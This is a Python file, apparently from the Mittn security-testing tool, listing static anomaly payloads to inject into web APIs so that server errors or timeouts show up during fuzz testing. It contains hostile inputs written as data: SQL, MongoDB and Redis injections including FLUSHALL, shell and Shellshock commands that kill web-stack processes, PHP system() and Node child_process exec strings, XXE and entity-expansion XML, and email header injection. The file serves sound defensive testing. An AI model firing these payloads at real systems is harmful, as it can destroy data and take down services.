# -*- coding: utf-8 -*-
# pylint: disable=line-too-long
"""List of static anomalies that can be injected.

Before using, replace mittn.org domain references with something you
have control over.

These injections should be designed to cause a detectable problem at
the server end. The tool doesn't check for reflected data, so any
XSS-style injections are mostly useless here. If you add new ones, try
to cause (any 5xx series) server error or a timeout. Alternatively,
try to inject some greppable string (POSSIBLE_INJECTION_PROBLEM used
here) that can potentially be caught by automated instrumentation at
target.

Trying to extract /etc/passwd, or something like that, may not trigger
a client-side detection of a successful injection. Try to trigger
reading from /dev/zero, /dev/random or some such place, sleep for a
prolonged time, or kill a number of processes related to the web
application stack. In these cases, you'd be more likely to cause at
least a timeout.

"""
__copyright__ = "Copyright (c) 2013- F-Secure"

anomaly_list = [
    # Valid cases
    "A harmless string",  # Something easy to start with
    str('\xc3\xa5\xc3\xa4\xc3\xb6'),  # Scandinavian characters as Unicode UTF-8

    # SQL and NoSQL injections
    "' --",  # SQL: End statement, start comment
    "' or 'x'='x' --",  # SQL: always true for strings
    "' or 1=1 --",  # SQL: End statement, evaluate to always true
    "1 OR 1=1 --",  # SQL: Always true for numbers
    "'; select datname from pg_database; --",  # PostgreSQL: list all tables
    "\\''; select datname from pg_database; --",  # PostgreSQL: list all tables, extra escape
    "&apos;&59; select datname from pg_database&59; --",  # PostgreSQL: list all tables, HTML entities
    "'; SHOW DATABASES; --",  # MySQL: list all databases
    "\\''; SHOW DATABASES; --",  # MySQL: list all databases, extra escape
    "&apos;&59; SHOW DATABASES&59; --",  # MySQL: list all databases, HTML entities
    "'; select global_name from global_name; --",  # Oracle: show current database
    "\\''; select global_name from global_name; --",  # Oracle: show current database, extra escape
    "&apos;&59; select global_name from global_name&59; --",  # Oracle: show current database, HTML entities
    "'; select * from SQLITE_MASTER; --",  # SQLite: show master table
    "\\''; select * from SQLITE_MASTER; --",  # SQLite: show master table, extra escape
    "&apos;&59; select * from SQLITE_MASTER&59; --",  # SQLite: show master table, HTML entities
    "'; select @@version; --",  # MS SQL Server: show DB details
    "\\''; select @@version; --",  # MS SQL Server: show DB details, extra escape
    "&apos;&59; select @@version&59; --",  # MS SQL Server: show DB details, HTML entities
    '/, "_id": /.*',  # End regex for MongoDB find function and inject a search parameter that matches all (and hope that makes the app barf)
    '.*/, $where : function() { sleep(1000000) }, "_id": /.*',  # End regex for MongoDB find function and inject JavaScript code (that is hopefully slow enough)
    '{ $ne : ""}',  # MongoDB match if parameter is not an empty string (and hopen that makes the app barf)
    '{ $where : function() { sleep(1000000) } }',  # MongoDB try to execute JavaScript that is slow
    '/.*/',  # MongoDB match everything as a regex (and again hope that breaks the app)
    '\nFLUSHALL',  # Redis: remove all keys from the system
    '\r\nFLUSHALL\r\n',  # Redis: remove all keys from the system
    '"\n  while true do\n  end\nfoo="',  # Redis: Lua code injection into a string
    "'\n  while true do\n  end\nfoo='",  # Redis: Lua code injection into a string
    '_rev',  # Perhaps confuses a CouchDB query
    '", "map":"function(map) { while(1); }", "',  # Try to inject a CouchDB map function
    'function(map) { while(1); }',  # Again try to inject a CouchDB map function
    '")\nLOAD CSV FROM "/dev/urandom" AS line //',  # Cypher (Neo4j) injection, hopefully induce a timeout
    "')\nLOAD CSV FROM '/dev/urandom' AS line //",  # Cypher (Neo4j) injection, hopefully induce a timeout

    # Regular expressions
    r'(?R)*',  # Infinite recursion (PCRE)
    r'\g<0>*',  # Infinite recursion (Ruby)
    r'(?0)*',  # Infinite recursion (Perl)

    # Shell injection
    r"`cat /dev/zero`",  # Backtick exec
    r"| cat /dev/zero;",  # Pipe exec
    "< /dev/zero;",  # stdin from /dev/zero
    "> /dev/null;",  # Send output to /dev/null
    "../" * 15 + "dev/zero",  # /etc/passwd
    "`killall -g apache php nginx python perl node postgres bash`",  # Backtick exec
    "| killall -g apache php nginx python perl node postgres bash;",  # Pipe exec
    "`ping localhost`",  # Backtick exec intended to cause a timeout
    "' . `killall -g apache php nginx python perl node postgres bash` . '",  # Backtick exec, single quote PHP insert
    '" . `killall -g apache php nginx python perl node postgres bash` . "',  # Backtick exec, double quote PHP insert
    "expect://killall%20-g%20apache%20php",  # A naïve try to leverage PHP's expect:// wrapper
    "ssh2.exec://localhost/killall%20-g%20apache%20php",  # A naïve try to leverage PHP's ssh2 wrapper
    "php://filter/resource=/dev/zero",  # A naïve try to leverage PHP's filter wrapper
    "compress.zlib:///dev/zero",  # A naïve try to leverage PHP's compression wrapper
    "glob://*",  # A naïve try to leverage PHP's glob wrapper
    '" . system(\'killall -g apache php nginx python perl node postgres bash\'); . "',  # E.g. PHP system exec, double quote insert
    "' . system(\'killall -g apache php nginx python perl node postgres bash\'); . '",  # E.g. PHP system exec, single quote insert
    "require('assert').fail(0,1,'Node injection','');",  # Node.js command injection
    "var sys = require('assert'); sys.fail(0,1,'Node injection','');",  # Node.js command injection,
    "var exec = require('child_process').exec; exec('ping 127.0.0.1');",  # Node.js command injection, aim at timeout
    "'; var exec = require('child_process').exec; exec('ping 127.0.0.1');",  # Node.js command injection, aim at timeout
    '() { :;}; exit',  # Shellshock: exit
    '() { :;}; cat /dev/zero',  # Shellshock: try to hang

    # PHP injection
    '<?php exit(1) ?>',  # Add PHP block that tries to exit with a nonzero return code
    '><?php exit(1) ?>',  # Add PHP block that tries to exit with a nonzero return code
    '?>',  # End PHP block (or <?xml element for that matter)
    '<?php',  # Start PHP block

    # URI injections (there are more above for PHP handlers)
    'javascript:sleep(1000000)',
    'data:text/plain;charset=utf-8;base64,UE9TU0lCTEVfSU5KRUNUSU9OX1BST0JMRU0=',
    'data:application/javascript;charset=utf-8;base64,c2xlZXAoMTAwMDAwMCkK',
    'data:text/html;charset=utf-8;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0PjwvaHRtbD4=',
    'tel:+358407531918',  # Likely not to have server side effect but can open a modal dialog on a client
    'sms:+358407531918',  # Likely not to have server side effect but can open a modal dialog on a client
    'mailto:injections@mittn.org',
    'netdoc:///dev/zero',  # Oracle Java pseudo-scheme
    'jar:///dev/zero!/foo',  # Try to open as a zip file
    'file:///dev/zero',

    # Stuff that tries to confuse broken OAuth processing
    'eyJhbGciOiJub25lIn0K.eyJyZnAiOiJtaXR0biIsCiJ0YXJnZXRfdXJpIjoiaHR0cDovL21pdHRuLm9yZyJ9Cg==.',  # A JWT state parameter
    'redirect_uri',
    'state',
    "&access_token=DUMMY_TOKEN_FROM_MITTN&",
    "?access_token=DUMMY_TOKEN_FROM_MITTN&",
    "&redirect_uri=http://mittn.org/attack&",   # Point to somewhere that returns an error; the test tool should follow redirects
    "?redirect_uri=http://mittn.org/attack&",  # Point to somewhere that returns an error; the test tool should follow redirects

    # Timestamps
    "1969-12-31T11:59:59.99Z",  # Just before Unix epoch anywhere on Earth
    "1969-12-31T23:59:59.99-25:00",  # In a place far away
    "1969-12-31T23:59:59.99+25:00",  # In a place far away
    "2273-01-01T12:00:00.00Z",  # Better get Enterprise going

    # Important numbers
    -1,
    "-1",
    0,
    "0",
    1,
    2,
    2 ** 8,
    -2 ** 8,
    2 ** 16,
    -2 ** 16,
    2 ** 32,
    -2 ** 32,
    -(2 ** 53),  # I-JSON "guaranteed" integer limit minus one
    2 ** 53,  # I-JSON "guaranteed" integer limit plus one
    2 ** 256,
    str(2 ** 256),
    -2 ** 256,
    str(-2 ** 256),
    1e-16,
    1e-32,
    3.141592653589793238462643383279,  # More precision than usually handled
    '\n1',
    '1\n',
    2.2250738585072011e-308,  # CVE-2010-4645
    "2.2250738585072011e-308",
    float('inf'),  # Infinity
    float('-inf'),  # Minus Infinity
    float('nan'),  # Not A Number

    # Truth values & stuff that isn't
    True,
    False,
    None,
    [],  # Empty list (serializes into an empty list in JSON)
    {},  # Empty dict (serializes into an empty dict in JSON)

    # Strings
    '',  # Nothingness
    '\n',  # LF
    '\r\n',  # CRLF
    '\n\r',  # LFCR
    ';',  # End a statement
    '{{',  # Start moustache
    '}}',  # End moustache
    '"',  # Close a string
    "'",  # Close a string
    '/*',  # Start of comment
    '#',  # Start of comment
    '//',  # Start of comment
    r'%',  # Start of comment
    '--',  # Start of SQL comment
    '?#',  # Start of PCRE comment (e.g., MongoDB regex queries)
    unichr(0),  # NULL
    unichr(0) + 'xxxxxxxx',  # NULL followed by more data
    unichr(0x1a),  # ctrl-z (end of stream)
    "\xff\xfe",  # Illegal unicode as string
    "\xff\xff",  # Illegal unicode as string
    '\t',  # tab
    '<?xml version="1.0"?><!DOCTYPE exp [ <!ENTITY exp "exp"><!ENTITY expa "' + '&exp;' * 100 + '"><!ENTITY expan "' + '&expa;' * 100 + '"><!ENTITY expand "' + '&expan;' * 100 + '"> ]><exp>&expand;</exp>',  # XML entity expansion,
    '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ENTITY bar SYSTEM "file:///dev/zero">]><foo>&bar;</foo>',  # XML external entity inclusion
    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x02\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x00',  # Broken BSON (invalid Boolean value)
    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x01\x04array\x00\x06\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x00',  # Broken BSON 2 (embedded document length overflow)
    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x01\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x03\x00\x00\x00\x00\x00\x00',  # Broken BSON 3 (string length overflow)
    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x01\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41',  # Broken BSON 4 (end zero missing and provide something for the parser to chew on)

    # Format strings
    r'%s',
    r'%d',

    # ANSI art makes your log files sparkle. These aren't likely to
    # get flagged by the tool, but if the test setup's log files are
    # viewed, these might highlight unwanted log injections
    "\x1b[0;1;40;32mM\x1b[0m   \x1b[1;32mM\x1b[0m \x1b[1;31mIII\x1b[32m TTT\x1b[0m \x1b[31mTTT\x1b[37m \x1b[1;34mN\x1b[0m  \x1b[1;34mN\r\n\x1b[32mMM\x1b[0m \x1b[1;32mMM\x1b[0m  \x1b[1;31mI\x1b[0m   \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mNN\x1b[0m \x1b[1;34mN\r\n\x1b[32mM\x1b[0m \x1b[1;32mM\x1b[0m \x1b[1;32mM\x1b[0m  \x1b[1;31mI\x1b[0m   \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mN\x1b[0m \x1b[1;34mNN\r\n\x1b[32mM\x1b[0m   \x1b[1;32mM\x1b[0m  \x1b[1;31mI\x1b[0m   \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mN\x1b[0m \x1b[1;34mNN\r\n\x1b[32mM\x1b[0m   \x1b[1;32mM\x1b[0m \x1b[1;31mIII\x1b[0m  \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mN\x1b[0m  \x1b[1;34mN\r\n\x1a",
    "\x1b[2JPOSSIBLE_INJECTION_PROBLEM",  # Clear screen and show a message
    '\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07',  # BELs

    # Email
    'root@[127.0.0.1]',  # Well-formed but localhost
    'root@localhost',  # Well-formed but localhost
    '@mittn.org',  # No user
    '@',  # No user or domain
    'nobody@mittn.org\nCc:nobodyneither@mittn.org',  # Header injection
    'nobody@mittn.org\r\nCc:nobodyneither@mittn.org',  # Header injection
    '\r\n.\r\n\r\nMAIL FROM:<root>\r\nRCPT TO:<nobody@mittn.org>\r\nDATA\r\nPOSSIBLE_INJECTION_PROBLEM\r\n.\r\n',  # SMTP injection

    # Long strings
    "A" * 256,
    "A" * 1025,
    "A" * 65537,
    ":-) =) XD o_O" * 10000,  # Rendering a lot of animated emoticons can cause pain
    "A" * (1024 * 1024)  # 1 MB
]
